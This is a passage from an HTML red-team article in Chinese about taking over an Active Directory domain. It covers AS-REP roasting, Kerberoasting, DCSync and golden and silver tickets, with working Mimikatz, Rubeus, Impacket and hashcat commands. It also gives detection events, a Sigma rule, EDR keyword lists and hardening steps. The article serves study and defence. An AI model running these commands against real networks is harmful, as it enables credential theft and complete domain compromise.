+<span class="n">adfind</span> <span class="n">-h</span> <span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-b</span> <span class="s2">&quot;DC=corp,DC=local&quot;</span> <span class="o">-f</span> <span class="s2">&quot;objectcategory=computer&quot;</span> <span class="n">name</span> <span class="n">operatingSystem</span>
+<span class="n">adfind</span> <span class="n">-h</span> <span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-b</span> <span class="s2">&quot;DC=corp,DC=local&quot;</span> <span class="o">-f</span> <span class="s2">&quot;(memberof=CN=Domain Admins,*)&quot;</span> <span class="n">distinguishedName</span>
+</code></pre></div>
+
+<p>BloodHound 的价值在于其图数据库能自动计算从当前权限到 Domain Admins 的最短攻击路径，例如通过 Kerberos 约束委派、WriteDACL、AddMember 等 ACL 滥用路径。</p>
+<h3>6.2 AS-REP Roasting</h3>
+<p>针对<strong>禁用预身份验证</strong>（<code>Do not require Kerberos preauthentication</code>）的域账户，攻击者无需任何凭据即可请求其 AS-REP 报文，其中包含用该账户密码加密的会话密钥，离线破解可得明文密码。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Impacket GetNPUsers（已知用户名列表）</span>
+python3<span class="w"> </span>GetNPUsers.py<span class="w"> </span>corp.local/<span class="w"> </span>-no-pass<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-format<span class="w"> </span>hashcat
+
+<span class="c1"># Rubeus（域内已获得立足点）</span>
+Rubeus.exe<span class="w"> </span>asreproast<span class="w"> </span>/format:hashcat<span class="w"> </span>/outfile:asrep.txt
+
+<span class="c1"># hashcat 离线破解</span>
+hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep.txt<span class="w"> </span>rockyou.txt
+</code></pre></div>
+
+<h3>6.3 Kerberoasting</h3>
+<p>任何域用户都可请求注册了 SPN（ServicePrincipalName）的服务账户的 TGS 票据，该票据用服务账户的密码哈希加密，可离线破解。攻击者只需一个普通域账户即可发起。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Impacket GetUserSPNs</span>
+python3<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>corp.local/user:password<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-request
+
+<span class="c1"># Rubeus</span>
+Rubeus.exe<span class="w"> </span>kerberoast<span class="w"> </span>/outfile:kerb.txt<span class="w"> </span>/domain:corp.local
+
+<span class="c1"># Mimikatz</span>
+mimikatz<span class="w"> </span><span class="s2">&quot;kerberos::list /export&quot;</span><span class="w"> </span><span class="nb">exit</span>
+
+<span class="c1"># hashcat 破解（RC4-HMAC 类型 13100）</span>
+hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>kerb.txt<span class="w"> </span>rockyou.txt
+</code></pre></div>
+
+<p>Kerberoasting 的防御难点：这是 Kerberos 协议的"正常功能"，无法完全禁止。关键在于确保服务账户使用<strong>长且随机</strong>的密码（25 字符以上），使离线破解不可行。</p>
+<h3>6.4 DCSync 攻击</h3>
+<p>拥有 <code>DS-Replication-Get-Changes</code> 和 <code>DS-Replication-Get-Changes-All</code> 权限的账户（Domain Admins、Exchange/AD Connect 服务账户等）可模拟域控，通过 DRSUAPI 远程拉取域内任意用户的哈希，包括 <code>krbtgt</code>。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># DCSync 攻击（需要 DCSync 权限，通常为 Domain Admins 或已委派的账户）</span>
+<span class="c1"># Mimikatz</span>
+mimikatz.exe<span class="w"> </span><span class="s2">&quot;lsadump::dcsync /domain:corp.local /user:krbtgt&quot;</span><span class="w"> </span><span class="nb">exit</span>
+
+<span class="c1"># Impacket secretsdump</span>
+python3<span class="w"> </span>secretsdump.py<span class="w"> </span>-just-dc<span class="w"> </span>domain/admin:password@DC_IP
+
+<span class="c1"># PowerView</span>
+Invoke-DCSync<span class="w"> </span>-Domain<span class="w"> </span>corp.local<span class="w"> </span>-User<span class="w"> </span>krbtgt
+</code></pre></div>
+
+<p>DCSync 的核心是调用 <code>IDL_DRSGetNCChanges</code> RPC 接口，域控之间本就用此接口同步目录数据。攻击者伪造一个域控身份发起请求，真实域控便会"乖乖"返回完整哈希。</p>
+<h3>6.5 黄金票据与白银票据</h3>
+<p>拿到 <code>krbtgt</code> 账户哈希后，可伪造任意用户的 TGT（黄金票据），实现全域持久化后门。即使域管密码全部重置，只要 <code>krbtgt</code> 未更改两次（历史哈希仍有效），攻击者仍可随时重返。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 黄金票据：使用 krbtgt 哈希伪造 TGT</span>
+mimikatz.exe<span class="w"> </span><span class="s2">&quot;kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_NTHASH /groups:512,513,514,518,519 /ticket:golden.kirbi /ptt&quot;</span><span class="w"> </span><span class="nb">exit</span>
+
+<span class="c1"># 白银票据：使用服务账户哈希伪造 TGS</span>
+mimikatz.exe<span class="w"> </span><span class="s2">&quot;kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /target:dc01.corp.local /service:cifs /rc4:SERVICE_NTHASH /ticket:silver.kirbi /ptt&quot;</span><span class="w"> </span><span class="nb">exit</span>
+
+<span class="c1"># 使用伪造票据访问域控</span>
+klist<span class="w">  </span><span class="c1"># 查看当前票据</span>
+dir<span class="w"> </span><span class="se">\\</span>dc01.corp.local<span class="se">\c</span>$
+</code></pre></div>
+
+<p>黄金票据与白银票据的关键区别：</p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>黄金票据 (Golden)</th>
+<th>白银票据 (Silver)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>伪造对象</td>
+<td>TGT（由 KDC 签发）</td>
+<td>TGS（由服务签发）</td>
+</tr>
+<tr>
+<td>所需哈希</td>
+<td>krbtgt 账户哈希</td>
+<td>服务账户哈希</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>整个域所有服务</td>
+<td>单个服务（如 CIFS/LDAP/MSSQL）</td>
+</tr>
+<tr>
+<td>是否经过 KDC</td>
+<td>是（但不验证）</td>
+<td>否（直接与服务交互）</td>
+</tr>
+<tr>
+<td>检测难度</td>
+<td>较易（TGT 异常字段）</td>
+<td>较难（无 KDC 交互日志）</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>7. 检测与加固方案</h2>
+<h3>7.1 关键检测事件</h3>
+<table>
+<thead>
+<tr>
+<th>事件 ID</th>
+<th>日志名称</th>
+<th>含义</th>
+<th>攻击阶段</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>4624</td>
+<td>Security</td>
+<td>登录成功（类型 3 网络登录、类型 10 远程交互）</td>
+<td>横向移动</td>
+</tr>
+<tr>
+<td>4672</td>
+<td>Security</td>
+<td>特权账户登录（含 SeDebugPrivilege 等）</td>
+<td>提权 / 域管活动</td>
+</tr>
+<tr>
+<td>4768</td>
+<td>Security</td>
+<td>TGT 请求（Kerberos AS-REQ）</td>
+<td>Kerberos 攻击</td>
+</tr>
+<tr>
+<td>4769</td>
+<td>Security</td>
+<td>TGS 请求（Kerberos TGS-REQ）</td>
+<td>Kerberoasting</td>
+</tr>
+<tr>
+<td>4662</td>
+<td>Security</td>
+<td>目录对象操作（DRSUAPI 复制）</td>
+<td>DCSync</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Sysmon</td>
+<td>进程访问（lsass.exe 被读）</td>
+<td>LSASS dump</td>
+</tr>
+<tr>
+<td>1</td>
+<td>Sysmon</td>
+<td>进程创建（命令行审计）</td>
+<td>全链路</td>
+</tr>
+</tbody>
+</table>
+<p><strong>DCSync 检测规则（Sigma 格式示例）：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="nt">title</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">DCSync Attack via DRSUAPI</span>
+<span class="nt">status</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">experimental</span>
+<span class="nt">logsource</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">product</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">windows</span>
+<span class="w">    </span><span class="nt">service</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">security</span>
+<span class="nt">detection</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">selection</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">EventID</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">4662</span>
+<span class="w">        </span><span class="nt">Properties</span><span class="p">:</span>
+<span class="w">            </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*&#39;</span><span class="w">  </span><span class="c1"># DS-Replication-Get-Changes</span>
+<span class="w">            </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*&#39;</span><span class="w">  </span><span class="c1"># DS-Replication-Get-Changes-All</span>
+<span class="w">    </span><span class="nt">filter</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">SubjectUserName|contains</span><span class="p">:</span>
+<span class="w">            </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;$&#39;</span><span class="w">           </span><span class="c1"># 域控机器账户</span>
+<span class="w">            </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;NT</span><span class="nv"> </span><span class="s">AUTHORITY&#39;</span>
+<span class="w">    </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">selection and not filter</span>
+<span class="nt">fields</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">SubjectUserName</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">SubjectIpAddress</span>
+<span class="nt">falsepositives</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">合法域控复制</span>
+<span class="nt">level</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">critical</span>
+</code></pre></div>
+
+<h3>7.2 EDR 规则要点</h3>
+<ul>
+<li><strong>LSASS 访问监控</strong>：Sysmon Event 10，监控非系统进程访问 lsass.exe，按进程签名、访问掩码（<code>PROCESS_VM_READ</code>）分级告警；</li>
+<li><strong>凭证操作命令行</strong>：匹配 <code>procdump</code>、<code>MiniDump</code>、<code>comsvcs</code>、<code>sekurlsa::</code>、<code>lsadump::</code> 等关键字；</li>
+<li><strong>异常 RPC 调用</strong>：非域控主机发起 DRSUAPI 绑定请求；</li>
+<li><strong>票据异常</strong>：TGT 中加密类型为 RC4（环境已升级 AES 时）、票据签发时间与当前偏差过大。</li>
+</ul>
+<h3>7.3 加固方案</h3>
+<p><strong>1. LSASS 保护（Credential Guard）：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c"># 启用 Credential Guard（Windows 10 1703+ / Server 2019+）</span>
+<span class="c"># 通过组策略：Computer Configuration &gt; Administrative Templates &gt; System &gt; Device Guard</span>
+<span class="c"># 或通过注册表 + DG ready 脚本</span>
+<span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">EnableVirtualizationBasedSecurity</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">1</span> <span class="p">/</span><span class="n">f</span>
+<span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">LsaCfgFlags</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">1</span> <span class="p">/</span><span class="n">f</span>
+<span class="c"># Credential Guard 将 LSASS 中的凭据用 VBS 隔离，dump 出来均为无效值</span>
+</code></pre></div>
+
+<p><strong>2. Tiered Admin 分层模型（AD 三层架构）：</strong></p>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────┐
+│  Tier 0: 域控 / 林根 (krbtgt / DC)          │  ← 最高权限，严禁从低层登录
+├─────────────────────────────────────────────┤
+│  Tier 1: 关键服务器 (文件/数据库/应用)      │  ← 独立管理员账户
+├─────────────────────────────────────────────┤
+│  Tier 2: 工作站 / 用户终端                  │  ← 日常账户
+└─────────────────────────────────────────────┘
+  规则：高层账户永不在低层主机登录（防凭据沉淀）
+        低层账户永不在高层主机登录（防提权跳板）
+</code></pre></div>
+
+<p><strong>3. 协议加固：</strong></p>
+<ul>
+<li>禁用 SMBv1（<code>Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol</code>）；</li>
+<li>限制 WMI over DCOM，改用 WinRM（配置允许的管理员白名单）；</li>
+<li>启用 SMB 签名与加密（<code>RequireSecuritySignature</code>）；</li>
+<li>LDAP 签名与 Channel Binding（防 LDAP 中继）。</li>
+</ul>
+<p><strong>4. Kerberos 策略加固：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c"># 强制 AES 加密类型，禁用 RC4</span>
+<span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">SupportedEncryptionTypes</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">0x7FFFFFFF</span> <span class="p">/</span><span class="n">f</span>
+
+<span class="c"># 设置 Kerberos 票据生命周期缩短（默认 10h，可调至 4h）</span>
+<span class="c"># 通过组策略：Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Account Policies &gt; Kerberos Policy</span>
+</code></pre></div>
+
+<p><strong>5. 账户加固：</strong></p>
+<ul>
+<li>服务账户（SPN 账户）使用 25 字符以上随机密码，或迁移至 gMSA（组托管服务账户）自动轮换；</li>
+<li>定期审计 DCSync 权限持有者，移除非必要委派（<code>Get-ADUser -Filter * -Properties * | Where-Object {$_.msDS-ReplAttributeMetaData}</code>）；</li>
+<li>对高权限账户启用 PAW（Privileged Access Workstation）隔离。</li>
+</ul>
+<hr />
+<h2>8. 总结</h2>
+<p>从 Webshell 到域控，这条攻击链的核心逻辑是<strong>逐层积累凭据与权限</strong>：</p>
+<ol>
+<li><strong>初始立足</strong>阶段，一个 Web 漏洞即可获得内网跳板，权限评估决定了后续攻击面大小；</li>
+<li><strong>本机提权</strong>阶段，配置错误往往比 0day 更致命——<code>SeImpersonatePrivilege</code>、服务权限错配是常见突破口；</li>
+<li><strong>凭据提取</strong>阶段，LSASS 内存是最大的凭据宝库，Credential Guard 是最强单点防御；</li>
+<li><strong>横向移动</strong>阶段，PtH 与 PtT 使攻击者无需破解密码即可在网络中自由穿梭；</li>
+<li><strong>域控接管</strong>阶段，DCSync 与 Golden Ticket 将局部权限放大为全域沦陷，且极难彻底清除。</li>
+</ol>
+<p>防御层面，单点防御无法阻断整条链路，必须构建纵深体系：<strong>入口加固</strong>（WAF / 代码审计）阻止 Webshell 落点 → <strong>端点防护</strong>（Credential Guard / EDR）减缓凭据泄露 → <strong>网络分段</strong>（微隔离 / Tiered Model）限制横向移动 → <strong>域层加固</strong>（权限最小化 / Kerberos AES / 审计告警）提升域控接管门槛。每一层防御不一定能完全阻断攻击，但能显著增加攻击者的时间成本与噪声，最终使攻击链在某一环断裂。</p>
+<p>红队评估的价值正在于此——在真实攻击者到来之前，找到那条尚未断裂的链条并加固它。</p>
+<hr />
+<h2>9. 免责声明</h2>
+<p>本文仅用于授权安全测试、红队评估与防御研究的技术复盘与学习交流。文中涉及的所有攻击技术、命令与代码示例，<strong>仅可在获得明确书面授权的测试环境中使用</strong>。未经授权对任何非自有系统实施本文所述技术，均属违法行为，可能触犯《中华人民共和国网络安全法》《刑法》第二百八十五条（非法侵入计算机信息系统罪）等相关法律法规。</p>
+<p>读者应确保自身行为符合当地法律法规与目标系统的授权范围。作者与发布平台不对任何人因不当使用本文内容而导致的任何法律后果承担责任。<strong>技术本身是中性的，关键在于使用者的意图与授权边界。</strong></p>
+<p>如需在企业环境中验证本文所述检测规则，请联系持有合法资质的安全服务商，在签署授权协议的受控环境下进行。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
